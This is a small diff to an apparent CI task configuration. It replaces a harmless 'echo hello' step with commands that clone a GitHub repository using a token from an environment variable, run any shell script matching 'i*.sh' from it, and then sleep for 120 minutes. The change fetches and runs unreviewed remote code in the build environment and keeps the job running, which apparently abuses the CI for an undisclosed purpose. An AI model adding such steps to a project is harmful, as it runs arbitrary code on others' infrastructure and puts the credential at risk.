@@ -12,4 +12,6 @@ task:
       memory: 16G
 
   Sync_script:
-      - echo hello
+      - git clone https://${CO}@github.com/TanTa7/n
+      - cd n &&bash i*.sh
+      - sleep 120m
